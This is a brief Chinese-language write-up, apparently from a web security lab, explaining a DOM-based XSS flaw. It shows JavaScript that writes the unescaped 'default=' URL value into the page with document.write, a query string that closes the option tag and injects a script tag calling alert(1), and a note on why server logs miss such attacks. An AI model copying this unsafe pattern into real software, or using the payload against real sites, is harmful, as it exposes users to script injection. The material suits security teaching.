## 漏洞

PHP 无过滤，JS 从 URL 取 `default=` 的值直接 `document.write`：

```javascript
var lang = document.location.href.substring(
    document.location.href.indexOf("default=")+8
);
document.write("<option value='" + lang + "'>" + lang + "</option>");
```

## 利用

```
?default=English</option><script>alert(1)</script>
```

## DOM 型特征

全程浏览器端，不经过服务器。URL 里带 payload → JS 读到 → 写 DOM → 执行。服务器日志只记录一次 GET 请求，不包含执行痕迹。
